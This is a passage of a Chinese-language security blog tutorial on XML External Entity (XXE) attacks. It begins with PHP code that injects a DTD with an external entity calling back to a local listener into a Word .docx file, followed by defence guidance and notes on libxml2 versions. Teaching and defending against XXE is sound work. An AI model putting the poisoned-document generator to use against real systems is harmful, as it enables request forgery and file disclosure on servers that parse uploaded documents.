class="variable">$zip</span>-&gt;addFromString(<span class="string">&quot;word/document.xml&quot;</span>,<span class="variable">$evilxml</span>);<span class="comment">//更新docx文件</span></span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    <span class="variable">$zip</span>-&gt;open(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$xml</span>=<span class="variable">$zip</span>-&gt;getFromName(<span class="string">&#x27;word/document.xml&#x27;</span>);</span><br><span class="line">    <span class="variable">$doc_xml</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$doc_xml</span>-&gt;loadXML(<span class="variable">$xml</span>); <span class="comment">//加载word文档</span></span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$doc_xml</span>-&gt;textContent; <span class="comment">//读取文档内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里定义想要添加的DTD内容和想要在XML中引用的实体</span></span><br><span class="line"><span class="variable">$dtd</span>=<span class="string">&#x27;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe  SYSTEM &quot;http://127.0.0.1:8088/?findneo&quot;&gt;&lt;!ENTITY int &quot;XXE&quot;&gt;]&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$entity_reference</span>=<span class="string">&quot;&amp;xxe; &amp;int; IS EXCITING!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;demo.docx&quot;</span>;<span class="comment">//生成文件的文件名</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;Across the Great Wall we can reach every corner in the world.&quot;</span>;<span class="comment">//文件内容，实体在该内容附近引用。</span></span><br><span class="line">genWord(<span class="variable">$name</span>,<span class="variable">$flag</span>);<span class="comment">//生成一个指定内容和文件名的正常docx文件</span></span><br><span class="line">poisonWord(<span class="variable">$name</span>,<span class="variable">$flag</span>,<span class="variable">$dtd</span>,<span class="variable">$entity_reference</span>);<span class="comment">//向正常文件注入DTD和实体引用，生成恶意文件</span></span><br><span class="line"><span class="keyword">echo</span> trigger(<span class="variable">$name</span>);<span class="comment">//加载文件，测试效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径</span></span><br><span class="line"><span class="comment">//extension=&quot;php_com_dotnet.dll 路径&quot;; extension=&quot;php_mbstring.dll 路径&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此外，Github项目 <a target="_blank" rel="noopener" href="https://github.com/BuffaloWill/oxml_xxe"><strong>oxml_xxe</strong></a>  支持更多文件类型。 </p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet">XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a> 。</p>
+<ul>
+<li>禁用外部实体 ( <a target="_blank" rel="noopener" href="http://cn2.php.net/libxml_disable_entity_loader">http://cn2.php.net/libxml_disable_entity_loader</a> 等)<ul>
+<li>对于PHP来说，尽管不同环境下<code>simplexml_load_string() </code> 默认行为并不一致，但为了安全应当总是<code>libxml_disable_entity_loader();</code> 。 </li>
+</ul>
+</li>
+<li>检验数据来源，过滤数据</li>
+</ul>
+<p>PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，<code>libxml2 Version</code> 可以在phpinfo里看，本文使用的是<code>2.7.8</code> 。</p>
+<p>这可能是一个误解的结果。</p>
+<blockquote>
+<p>在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因： </p>
+<p>1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p>
+<p>2.官方尚未注意到这个问题。</p>
+<p>感觉前者的可能性较大。  </p>
+<p>—— wooyun-2015-0156208</p>
+</blockquote>
+<p>可以结合 <a target="_blank" rel="noopener" href="http://www.xmlsoft.org/news.html">change log</a> 和 <a target="_blank" rel="noopener" href="https://github.com/GNOME/libxml2/commits">GitHub commit</a> 了解 libxml2 各版本具体改动。</p>
+<p>可以看到与主题较相关的有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v2<span class="number">.9</span><span class="number">.5</span>: Sep <span class="number">04</span> <span class="number">2017</span></span><br><span class="line">    Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)</span><br><span class="line">    Prevent unwanted external entity reference</span><br><span class="line">v2<span class="number">.9</span><span class="number">.2</span>: Oct <span class="number">16</span> <span class="number">2014</span></span><br><span class="line">    Security:</span><br><span class="line">	Fix <span class="keyword">for</span> CVE<span class="number">-2014</span><span class="number">-3660</span> billion laugh variant (Daniel Veillard),</span><br><span class="line">	CVE<span class="number">-2014</span><span class="number">-0191</span> <span class="keyword">Do</span> not fetch external parameter entities (Daniel Veillard)</span><br><span class="line"><span class="number">2.9</span><span class="number">.1</span>: Apr <span class="number">19</span> <span class="number">2013</span></span><br><span class="line">    Activate detection of encoding in external subset</span><br><span class="line"><span class="number">2.9</span><span class="number">.0</span>: Sep <span class="number">11</span> <span class="number">2012</span></span><br><span class="line">    <span class="keyword">Do</span> not fetch external parsed entities</span><br></pre></td></tr></table></figure>
+
+<h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">XML Out-Of-Band Data Retrieval</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf">XMLDTDEntityAttacks.pdf</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Processing</a> </li>
+<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防——XXE漏洞攻防</a> </li>
+<li><a target="_blank" rel="noopener" href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">DTD Cheat Sheet</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.tutorialspoint.com/dtd/dtd_syntax.htm">DTD - Syntax</a> </li>
+<li><a target="_blank" rel="noopener" href="https://phonexicum.github.io/infosec/xxe.html">Information Security / infosec / XXE</a> </li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/staaldraad/01415b990939494879b4">XXE_payloads</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD Tutorial</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.w3.org/TR/xml/">Extensible Markup Language (XML) 1.0 (Fifth Edition)</a> </li>
+<li><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110).aspx">about XML entity at msdn</a>  </li>
+<li>Spring MVC xml绑定pojo造成的XXE （乌云papers-1911）</li>
+<li>Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035）</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180727PenetrationTool/" rel="prev" title="【译】渗透测试工具备忘录">
+      <i class="fa fa-chevron-left"></i> 【译】渗透测试工具备忘录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180814-python-jail-escape/" rel="next" title="TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法">
+      TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WHAT"><span class="nav-number">1.</span> <span class="nav-text">WHAT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML"><span class="nav-number">1.1.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD"><span class="nav-number">1.2.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ENTITY"><span class="nav-number">1.3.</span> <span class="nav-text">ENTITY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E9%80%A0%E6%88%90%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.4.</span> <span class="nav-text">可能造成的危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HOW"><span class="nav-number">2.</span> <span class="nav-text">HOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD%E5%8F%91%E8%B5%B7%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82"><span class="nav-number">2.1.</span> <span class="nav-text">利用引用外部DTD发起网络请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%99%AE%E9%80%9AXXE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C"><span class="nav-number">2.2.</span> <span class="nav-text">利用普通XXE读取文件&#x2F;访问网络</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8F%82%E6%95%B0XXE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C"><span class="nav-number">2.3.</span> <span class="nav-text">利用参数XXE读取文件&#x2F;访问网络</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-OOB"><span class="nav-number">2.4.</span> <span class="nav-text">XXE OOB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9E%E6%A1%88%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">真实案例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0XXE"><span class="nav-number">4.</span> <span class="nav-text">发现XXE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8FWord%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">生成恶意Word文档</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">6.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E9%98%85%E8%AF%BB"><span class="nav-number">7.</span> <span class="nav-text">扩展阅读</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
